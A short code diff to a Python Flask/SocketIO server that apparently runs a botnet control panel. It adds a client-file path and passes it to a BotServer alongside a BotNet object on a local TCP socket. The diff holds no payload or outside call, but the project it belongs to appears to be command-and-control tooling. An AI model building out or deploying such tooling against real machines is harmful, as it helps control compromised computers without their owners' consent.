@@ -3,6 +3,7 @@ import socket
 from flask import Flask, render_template, session, request, Response
 from flask_socketio import SocketIO, emit
 from functools import wraps
+import importlib
 from werkzeug import secure_filename
 
 # Loading library depends on how we want to setup the project later,
@@ -20,6 +21,7 @@ HOST = 'localhost'
 PORT = 1708
 connected = ''  # temp variable for testing
 UPLOAD_FOLDER = 'static/uploads/'  # TODO
+CLIENT_FILE = '../client/client.py' # TODO
 
 # Set this variable to "threading", "eventlet" or "gevent" to test the
 # different async modes, or leave it set to None for the application to choose
@@ -87,7 +89,7 @@ if __name__ == "__main__":
     TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     TCPSOCK.bind((HOST, PORT))
     botnet = BotNet(socketio)
-    botserver = BotServer(TCPSOCK, botnet, socketio)
+    botserver = BotServer(TCPSOCK, botnet, socketio, CLIENT_FILE)
 
     botnet.start()
     botserver.start()
